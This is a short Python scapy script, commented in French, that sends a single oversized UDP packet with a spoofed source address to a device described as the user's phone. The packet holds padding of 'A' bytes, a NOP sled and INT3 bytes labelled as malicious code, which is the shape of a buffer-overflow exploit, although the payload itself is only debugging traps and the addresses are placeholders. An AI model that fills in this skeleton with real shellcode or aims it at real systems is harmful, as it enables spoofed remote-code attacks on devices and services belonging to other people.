import socket
import logging
from scapy.all import *

def main():
    try:
        # Configurez le logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

        # Adresse IP source et port source (falsifiés)
        src_ip = "192.0.2.1"  # Exemple d'adresse IP (vous pouvez la remplacer par une adresse IP légitime)
        src_port = 12345

        # Adresse IP et port de destination (votre téléphone)
        dst_ip = "192.0.2.2"  # Remplacez par l'adresse IP de votre téléphone
        dst_port = 1234

        # Construction de l'en-tête IP
        ip = IP(src=src_ip, dst=dst_ip)

        # Construction de l'en-tête UDP
        udp = UDP(sport=src_port, dport=dst_port)

        # Construction des données du paquet
        offset = 1024  # Exemple d'offset
        nop_sled = b'\x90' * 100  # NOP sled
        int3 = b'\xCC' * 4  # INT3 instructions for debugging
        malicious_code = nop_sled + int3
        data = b'A' * offset + malicious_code + b'\x00' * (65507 - offset - len(malicious_code))

        # Construction du paquet
        pkt = ip / udp / data

        # Envoi du paquet
        send(pkt)
        logging.info(f"Paquet UDP envoyé de {src_ip}:{src_port} à {dst_ip}:{dst_port}")

    except Exception as e:
        logging.error("Une erreur s'est produite: %s", e)

if __name__ == "__main__":
    main()